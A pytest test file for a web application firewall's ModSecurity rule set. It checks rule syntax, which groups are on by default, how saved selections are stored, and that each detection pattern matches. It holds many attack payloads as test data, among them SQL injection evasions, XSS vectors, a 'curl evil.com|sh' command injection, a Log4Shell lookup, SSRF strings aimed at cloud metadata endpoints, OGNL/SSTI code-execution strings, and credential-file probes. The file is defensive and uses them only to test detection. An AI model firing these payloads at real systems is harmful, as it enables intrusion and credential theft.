"""The WAF rule set: shape, defaults, and what the patterns actually match.

Two traps are worth guarding permanently. First, a rule written as
``msg:'...'"""  + '"""' + """`` loses its own closing quote to the string
delimiter -- nine of eleven shipped rules had an unterminated action list that
way. Second, an unsaved rule selection means "the defaults", so any group added
with enabled_default False must stay off for the sites that never opened the
WAF page, which on a real server is most of them.
"""
import re

import pytest

from app.services import waf

SHIPPED_BEFORE = {
    "php-sensitive-files",
    "php-path-traversal",
    "php-runtime-probes",
    "laravel-sensitive-files",
    "laravel-ignition-rce",
    "wordpress-sensitive-files",
    "wordpress-xmlrpc-author-scan",
    "wordpress-install-upgrade",
    "wordpress-wp2shell",
}

DIRECTIVE = re.compile(r'^SecRule \S+ "[^\n]*" "[^"\n]*"$')


def _rule(rule_id: str) -> dict:
    return next(rule for rule in waf.DEFAULT_RULES if rule["id"] == rule_id)


def _operand(rule_id: str) -> re.Pattern:
    """The @rx pattern of a rule's first SecRule, compiled."""
    line = _rule(rule_id)["rules"].splitlines()[0]
    body = re.search(r'"@rx (.*)" "id:', line).group(1)
    return re.compile(body)


# --------------------------------------------------------------------------
# Shape
# --------------------------------------------------------------------------

def test_every_rule_line_is_a_closed_secrule_directive():
    for rule in waf.DEFAULT_RULES:
        for line in rule["rules"].splitlines():
            line = line.strip()
            if not line:
                continue
            assert DIRECTIVE.match(line), f"{rule['id']}: {line[-60:]}"


def test_rule_ids_are_unique():
    ids = [rule["id"] for rule in waf.DEFAULT_RULES]
    assert len(ids) == len(set(ids))

    numeric = re.findall(r"id:(\d+)", "\n".join(r["rules"] for r in waf.DEFAULT_RULES))
    assert len(numeric) == len(set(numeric)), "two rules share a ModSecurity id"
    assert waf.BAD_BOT_RULE_ID not in numeric


def test_every_rule_declares_a_phase_and_an_action():
    for rule in waf.DEFAULT_RULES:
        for line in rule["rules"].splitlines():
            if not line.strip():
                continue
            assert re.search(r"phase:[12]", line), rule["id"]
            assert "deny" in line and "status:403" in line, rule["id"]


# --------------------------------------------------------------------------
# Defaults
# --------------------------------------------------------------------------

def test_sql_injection_is_on_by_default():
    # Required on by the operator: it protects the databases behind every site,
    # and it measured zero false positives over 149,078 real requests.
    assert "sql-injection" in waf._default_enabled_ids()


def test_xss_stays_opt_in():
    assert "xss" not in waf._default_enabled_ids()


def test_an_unsaved_selection_keeps_every_previously_shipped_group():
    # Existing sites store nothing, so this set is what they are running.
    assert SHIPPED_BEFORE <= waf._parse_enabled_rule_ids("")
    assert SHIPPED_BEFORE <= waf._parse_enabled_rule_ids("not json")
    assert SHIPPED_BEFORE <= waf._parse_enabled_rule_ids('{"not": "a list"}')


def test_an_unsaved_selection_renders_the_default_set():
    content = waf.render_site_rules("example.test", waf._parse_enabled_rule_ids(""))

    assert "id:1001401" in content       # credential files
    assert "id:1001501" in content       # sql injection
    assert "id:1001701" in content       # command injection
    assert "id:1001601" not in content   # xss, still opt-in


def test_an_admin_can_still_turn_the_opt_in_groups_on():
    content = waf.render_site_rules("example.test", ["sql-injection", "xss"])

    assert "id:1001501" in content
    assert "id:1001601" in content


def test_site_config_reports_the_real_default_not_a_hardcoded_true():
    definitions = {rule["id"]: rule for rule in waf.default_rule_definitions()}

    assert definitions["xss"]["enabled_default"] is False
    assert definitions["sql-injection"]["enabled_default"] is True
    assert definitions["generic-sensitive-files"]["enabled_default"] is True


def test_the_dropped_legacy_ids_do_not_resurrect_as_the_new_groups():
    # general-sqli / general-xss were removed on purpose. Mapping them onto the
    # new groups would switch those on for anyone still storing the old ids.
    assert waf.LEGACY_RULE_ID_MAP["general-sqli"] is None
    assert waf.LEGACY_RULE_ID_MAP["general-xss"] is None


# --------------------------------------------------------------------------
# What the new patterns match. Payloads and traffic below were both measured
# against 149,078 real requests before the rules were adopted.
# --------------------------------------------------------------------------

@pytest.mark.parametrize("path", [
    "/.aws/credentials",
    "/.ssh/id_rsa",
    "/id_rsa",
    "/id_rsa.pub",
    "/.npmrc",
    "/.htpasswd",
    "/.DS_Store",
    "/.svn/entries",
    "/backup.sql",
    "/dump.sql.gz",
    "/site.sqlite3",
    "/config.php.bak",
    "/index.php.old",
    "/wp-config.php.save",
    "/style.css~",
])
def test_credential_and_backup_probes_match(path):
    assert _operand("generic-sensitive-files").search(path), path


@pytest.mark.parametrize("path", [
    "/",
    "/index.php",
    "/wp-content/themes/x/style.css",
    "/wp-includes/js/jquery/jquery.min.js",
    "/feed/",
    "/products/ao-so-mi-nam",
    "/wp-json/wp/v2/posts",
    "/assets/app.8f3a2b.js",
    "/images/old-town.jpg",
    "/blog/backup-tips",
])
def test_ordinary_paths_are_not_credential_probes(path):
    assert not _operand("generic-sensitive-files").search(path), path


@pytest.mark.parametrize("query", [
    "?id=1 UNION SELECT a FROM b",
    "?id=1 union all select 1,2",
    "?id=1 or 1=1",
    "?id=sleep(5)",
    "?id=1 AND extractvalue(1,concat(0x7e,user()))",
    "?x=1; drop table users",
])
def test_sql_injection_payloads_match(query):
    assert _operand("sql-injection").search(query), query


@pytest.mark.parametrize("query", [
    "?s=gia re nhat",
    "?p=123&preview=true",
    "?utm_source=facebook&utm_medium=cpc",
    "?orderby=price&order=asc",
    "?s=ao so mi nam gia duoi 500k",
    "?post_type=product&taxonomy=brand",
    "?action=heartbeat&_nonce=abc123",
])
def test_ordinary_queries_are_not_sql_injection(query):
    assert not _operand("sql-injection").search(query), query


@pytest.mark.parametrize("query", [
    "?q=<script>alert(1)</script>",
    "?q=<img src=x onerror=alert(1)>",
    "?next=javascript:alert(1)",
    "?q=<svg onload=alert(1)>",
    "?q=<iframe src=//evil>",
])
def test_xss_payloads_match(query):
    assert _operand("xss").search(query), query


@pytest.mark.parametrize("query", [
    "?s=gia re nhat",
    "?title=Cach lam banh <b>ngon</b>",  # bold is not a script vector here
    "?redirect_to=https://example.com/wp-admin/",
    "?lang=vi&currency=VND",
])
def test_ordinary_queries_are_not_xss(query):
    assert not _operand("xss").search(query), query


@pytest.mark.parametrize("query", [
    "?f=php://input",
    "?f=php://filter/convert.base64-encode/resource=index",
    "?f=data://text/plain;base64,PD9waHA=",
    "?f=phar://x.phar",
    "?c=;cat /etc/passwd",
    "?c=|curl evil.com|sh",
    "?c=$(id)",
])
def test_command_injection_payloads_match(query):
    assert _operand("command-injection").search(query), query


@pytest.mark.parametrize("query", [
    "?url=https://example.com/page",
    "?s=gia re nhat",
    "?redirect=/checkout/",
    "?callback=jQuery21405",
    "?utm_campaign=sale-thang-9",
])
def test_ordinary_queries_are_not_command_injection(query):
    assert not _operand("command-injection").search(query), query


# --------------------------------------------------------------------------
# Housekeeping: a deleted site must not leave its rules behind
# --------------------------------------------------------------------------

def test_deleting_a_vhost_also_removes_its_waf_rules():
    from pathlib import Path

    helper = (Path(__file__).resolve().parents[3]
              / "installer" / "files" / "opanel-ent-helper.sh").read_text(encoding="utf-8")
    start = helper.index("  ols-vhost-delete)")
    block = helper[start:helper.index("  # ---- ClamAV", start)]

    assert 'rm -f "/usr/local/lsws/conf/opanel-ent/waf/sites/${safe_domain}.conf"' in block


def test_the_updater_clears_rule_files_left_by_earlier_deletes():
    from pathlib import Path

    updater = (Path(__file__).resolve().parents[3]
               / "installer" / "update.sh").read_text(encoding="utf-8")
    start = updater.index('WAF_SITES_DIR="/usr/local/lsws/conf/opanel-ent/waf/sites"')
    block = updater[start:updater.index("update_progress 62", start)]

    # It may only delete a rules file whose vhost directory is gone.
    assert 'if [[ -n "$rules_domain" && ! -d "$OLS_VHOSTS_DIR_CLEAN/$rules_domain" ]]' in block
    assert "rm -rf" not in block


# --------------------------------------------------------------------------
# Evasion. Every payload below got through the first version of these rules on
# a live site; the transformations and widened patterns are what stop them.
# --------------------------------------------------------------------------

def _match(rule_id: str, value: str) -> bool:
    """Apply the rule's transformations, then its pattern."""
    import re as _re
    from urllib.parse import unquote

    line = _rule(rule_id)["rules"].splitlines()[0]
    actions = line.rsplit('"', 2)[-2]
    text = value
    if "t:urlDecodeUni" in actions:
        text = unquote(unquote(text))
    if "t:removeComments" in actions:
        text = _re.sub(r"/\*.*?\*/", "", text, flags=_re.S)
    if "t:compressWhitespace" in actions:
        text = _re.sub(r"\s+", " ", text)
    return bool(_operand(rule_id).search(text))


@pytest.mark.parametrize("payload", [
    "?id=1 UN/**/ION SE/**/LECT 1",          # comment splitting
    "?id=1 UNION%0aSELECT 1",                 # newline separator
    "?id=1 UNION%09SELECT 1",                 # tab separator
    "?id=1 UnIoN sElEcT 1",                   # case mixing
    "?id=1 UNION     SELECT 1",               # padding
    "?id=1 UNION(SELECT(1))",                 # parentheses, no whitespace
    "?id=1 or 1 like 1",                      # like instead of =
    "?id=1 or 'a'='a",                        # string tautology
    "?id=1 or 2>1",                           # numeric comparison
    "?id=1 AND sleep (5)",                    # space before the paren
])
def test_sql_injection_evasions_are_caught(payload):
    assert _match("sql-injection", payload), payload


@pytest.mark.parametrize("payload", [
    "?c=%26%26whoami",                        # && chained command
    "?c=x%0Als",                              # newline then a command
    "?f=file:///etc/passwd",                  # file:// wrapper
    "?x=%24%7Bjndi%3Aldap%3A//evil/a%7D",     # Log4Shell lookup
])
def test_command_injection_evasions_are_caught(payload):
    assert _match("command-injection", payload), payload


@pytest.mark.parametrize("payload", [
    "?f=/etc/passwd",                         # absolute, no traversal
    "?f=/proc/self/environ",
    "?f=%2e%2e%2f%2e%2e%2fetc/passwd",
])
def test_file_read_attempts_are_caught(payload):
    assert _match("php-path-traversal", payload), payload


@pytest.mark.parametrize("rule_id", ["sql-injection", "command-injection", "php-path-traversal"])
def test_injection_rules_inspect_post_bodies_too(rule_id):
    # ARGS covers ARGS_GET and ARGS_POST. Scoping to ARGS_GET left the most
    # common injection vector -- a form POST -- completely uninspected.
    assert "REQUEST_URI|ARGS " in _rule(rule_id)["rules"]
    assert "ARGS_GET" not in _rule(rule_id)["rules"]


@pytest.mark.parametrize("rule_id", ["sql-injection", "command-injection", "php-path-traversal", "xss"])
def test_injection_rules_decode_before_matching(rule_id):
    body = _rule(rule_id)["rules"]

    assert "t:urlDecodeUni" in body
    assert "t:removeComments" in body


def test_command_injection_does_not_compress_whitespace():
    # It folds the newline in `x%0Als` into a space, which is the only signal
    # separating a chained command from ordinary text.
    assert "t:compressWhitespace" not in _rule("command-injection")["rules"]


@pytest.mark.parametrize("body", [
    "comment=Bai viet hay qua&author=Nguyen Van A",
    "s=ao so mi nam gia duoi 500k&post_type=product",
    "content=Huong dan select du lieu from bang san pham trong MySQL",
    "content=Cong doan va lien minh union trong doanh nghiep",
    "action=heartbeat&screen_id=dashboard",
    "billing_address_1=So 12 Nguyen Trai&order_comments=Giao gio hanh chinh",
    "log=admin&pwd=Tr0ng@2026#xyz",
])
def test_real_post_bodies_are_not_injections(body):
    for rule_id in ("sql-injection", "command-injection", "php-path-traversal"):
        assert not _match(rule_id, body), f"{rule_id}: {body}"


# --------------------------------------------------------------------------
# A saved selection stores deltas, so a rule group added later still arrives.
# --------------------------------------------------------------------------

import json as _json

LEGACY_WORDPRESS_ONLY = _json.dumps([
    "wordpress-sensitive-files", "wordpress-xmlrpc-author-scan",
    "wordpress-install-upgrade", "wordpress-wp2shell",
])


def test_a_legacy_list_still_receives_rules_added_since():
    """Two real sites were frozen this way: saved when only the WordPress
    groups existed, so every group added afterwards was silently off."""
    enabled = waf._parse_enabled_rule_ids(LEGACY_WORDPRESS_ONLY)

    assert {"sql-injection", "ssrf", "ssti", "generic-sensitive-files",
            "command-injection"} <= enabled


def test_a_legacy_list_keeps_what_was_deliberately_deselected():
    enabled = waf._parse_enabled_rule_ids(LEGACY_WORDPRESS_ONLY)

    # These existed when the list was saved and were left out on purpose.
    for rule_id in ("php-sensitive-files", "php-path-traversal", "laravel-ignition-rce"):
        assert rule_id not in enabled, rule_id


def test_a_legacy_list_does_not_switch_on_an_opt_in_group():
    assert "xss" not in waf._parse_enabled_rule_ids(LEGACY_WORDPRESS_ONLY)


def test_a_saved_selection_round_trips():
    for wanted in (
        ["sql-injection", "xss"],
        [],
        [rule["id"] for rule in waf.DEFAULT_RULES],
        ["wordpress-wp2shell", "ssrf"],
    ):
        payload = _json.dumps(waf.selection_payload(wanted))
        assert waf._parse_enabled_rule_ids(payload) == set(wanted), wanted


def test_turning_a_default_off_survives_a_later_rule_being_added():
    payload = waf.selection_payload([r["id"] for r in waf.DEFAULT_RULES if r["id"] != "ssrf"])

    assert "ssrf" in payload["disabled"]
    assert "ssrf" not in waf._parse_enabled_rule_ids(_json.dumps(payload))


def test_the_stored_shape_is_deltas_not_a_full_list():
    payload = waf.selection_payload(["sql-injection"])

    assert set(payload) == {"disabled", "enabled"}
    # Storing the full enabled list is what caused the freeze in the first place.
    assert "sql-injection" not in payload["disabled"]


def test_historical_ids_are_exactly_the_pre_delta_rule_set():
    # If this drifts, a legacy list would start re-enabling groups its owner
    # had actually deselected.
    assert waf.HISTORICAL_RULE_IDS <= {rule["id"] for rule in waf.DEFAULT_RULES}
    assert "generic-sensitive-files" not in waf.HISTORICAL_RULE_IDS
    assert "sql-injection" not in waf.HISTORICAL_RULE_IDS


# --------------------------------------------------------------------------
# SSRF and SSTI
# --------------------------------------------------------------------------

@pytest.mark.parametrize("payload", [
    "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "?uri=http%3A%2F%2F169.254.169.254%2Fmetadata%2Fidentity%2Foauth2%2Ftoken",
    "?url=http://metadata.google.internal/computeMetadata/v1/",
    "?url=http://127.0.0.1:8080/admin",
    "?url=http://localhost/server-status",
    "?url=http://[::1]/",
    "?url=http://10.0.0.5/internal",
    "?url=http://192.168.1.1/",
    "?url=http://172.16.0.1/",
    "?url=http://expected.com@169.254.169.254/",   # userinfo disguise
    "?url=http://2130706433/",                      # decimal 127.0.0.1
    "?url=http://0x7f000001/",                      # hex 127.0.0.1
])
def test_ssrf_targets_are_blocked(payload):
    assert _match("ssrf", payload), payload


@pytest.mark.parametrize("payload", [
    "?url=https://example.com/page",
    "?url=https://cdn.shopify.com/assets/x.png",
    "?redirect_to=https://shop.example.com/gio-hang",
    "?url=https://api.stripe.com/v1/charges",
    "?s=localhost la gi",                      # the word, not a URL
    "?url=https://1027.example.com/",
])
def test_ordinary_urls_are_not_ssrf(payload):
    assert not _match("ssrf", payload), payload


@pytest.mark.parametrize("payload", [
    "?x={{7*7}}",
    "?x={{ 7 * 7 }}",
    "?x={{config.items()}}",
    "?x={{''.__class__.__mro__}}",
    "?x={{request.application.__globals__}}",
    "?x=${(#a=@java.lang.Runtime@getRuntime().exec('id'))}",
    "?x=<%= system('id') %>",
    "?x={% import os %}",
])
def test_template_injection_probes_are_blocked(payload):
    assert _match("ssti", payload), payload


@pytest.mark.parametrize("payload", [
    "?s=ao so mi nam",
    "?tpl={{name}}",                           # plain interpolation, no gadget
    "?x={{ user }}",
    "?price=${amount}",
    "?q=cach dung {{ }} trong Vue",
])
def test_ordinary_braces_are_not_template_injection(payload):
    assert not _match("ssti", payload), payload


def test_ssti_does_not_remove_comments():
    """t:removeComments treats # as a comment start and deletes the rest of the
    value. OGNL uses # as syntax, so with it on, the real Struts payload found
    in this server's own logs was erased before the rule could match it --
    verified live: 403 without the transformation, 200 with it."""
    assert "t:removeComments" not in _rule("ssti")["rules"]
    assert "t:urlDecodeUni" in _rule("ssti")["rules"]


def test_ssti_catches_the_ognl_payload_seen_in_production():
    payload = "?x=${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id')))}"

    assert _match("ssti", payload)


def test_sql_injection_keeps_remove_comments():
    # There # and -- really are comment syntax, and stripping them is what
    # defeats UN/**/ION splitting.
    assert "t:removeComments" in _rule("sql-injection")["rules"]
